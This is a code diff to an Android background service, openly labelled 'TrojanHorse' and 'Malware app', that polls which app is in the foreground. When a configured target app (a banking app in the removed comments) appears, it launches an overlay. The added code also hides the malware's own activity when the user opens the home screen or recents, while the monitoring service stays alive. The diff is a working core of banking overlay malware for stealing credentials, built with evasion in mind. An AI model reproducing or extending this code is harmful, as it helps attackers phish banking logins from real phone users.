@@ -15,7 +15,6 @@ class AppMonitoringService : Service() {
         private const val TAG = "TrojanHorse"
     }
 
-
     private val targetAppPackage = BuildConfig.TARGET_PACKAGE
     private val targetActivity = BuildConfig.TARGET_ACTIVITY
     private var lastLoggedApp = ""
@@ -36,26 +35,41 @@ class AppMonitoringService : Service() {
         return START_STICKY
     }
 
+    private var foregroundApp = ""
+    private var foregroundActivity = ""
+
     private fun monitorForegroundApps() {
         try {
             while (true) {
                 val info = getForegroundAppAndActivity()
-                val foregroundApp = info.first
-                val foregroundActivity = info.second
+                if (foregroundApp == info.first && foregroundActivity == info.second) {
+                    continue
+                }
+                foregroundApp = info.first
+                foregroundActivity = info.second
 
                 // Log all foreground apps (but avoid spamming logs with the same app repeatedly)
                 if (foregroundApp.isNotEmpty() && foregroundApp != lastLoggedApp) {
-                    Log.d(TAG, "Detected foreground app: $foregroundApp")
+                    Log.d(
+                        TAG,
+                        "Detected foreground app: $foregroundApp, activity: $foregroundActivity"
+                    )
                     lastLoggedApp = foregroundApp
                 }
 
-                // Check if the target banking app is in the foreground
+                // Check if the user has switched to the target app
                 if (foregroundApp == targetAppPackage) {
-                    Log.d(TAG, "TARGET DETECTED: Banking app $targetAppPackage in foreground")
-                    if (foregroundActivity == targetActivity) {
-                        Log.d(TAG, "TARGET Activity DETECTED: Banking app $targetActivity in foreground - launching overlay")
-                        launchOverlay()
-                    }
+                    Log.d(TAG, "Target app detected - launching overlay")
+                    Thread.sleep(1000)
+                    launchOverlay()
+                }
+
+                // Check if home screen launcher is detected or user went to recents
+                if ((foregroundApp == "com.android.launcher" && foregroundActivity == "com.android.launcher.Launcher") ||
+                    (foregroundApp == "com.android.systemui" && foregroundActivity == "com.android.systemui.recents.RecentsActivity")
+                ) {
+                    Log.d(TAG, "Home screen or recents detected - killing Malware app")
+                    killMainActivity()
                 }
 
                 // Sleep for a short period before checking again (300ms)
@@ -65,7 +79,6 @@ class AppMonitoringService : Service() {
             Log.e(TAG, "Error in monitoring: ${e.message}")
         }
     }
-
 
     private fun getForegroundAppAndActivity(): Pair<String, String> {
         var currentApp = ""
@@ -91,7 +104,10 @@ class AppMonitoringService : Service() {
                 if (event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND) {
                     currentApp = event.packageName
                     currentActivity = event.className
-                    Log.v(TAG, "MOVE_TO_FOREGROUND event: ${event.packageName}")
+                    Log.v(
+                        TAG,
+                        "MOVE_TO_FOREGROUND event: ${event.packageName} && ${event.className}"
+                    )
                 }
             }
         } catch (e: Exception) {
@@ -108,6 +124,22 @@ class AppMonitoringService : Service() {
         }
         startActivity(overlayIntent)
         Log.i(TAG, "Overlay launched for target app")
+    }
+
+    /**
+     * Kills only the MainActivity while keeping the service alive
+     * Uses multiple approaches for maximum reliability
+     */
+    private fun killMainActivity() {
+        try {
+            Log.d(TAG, "Attempting to kill MainActivity")
+            val killIntent = Intent(MainActivity.KILL_ACTION)
+            killIntent.setPackage(packageName)
+            sendBroadcast(killIntent)
+            Log.d(TAG, "Kill broadcast sent")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error killing MainActivity: ${e.message}")
+        }
     }
 
     override fun onDestroy() {
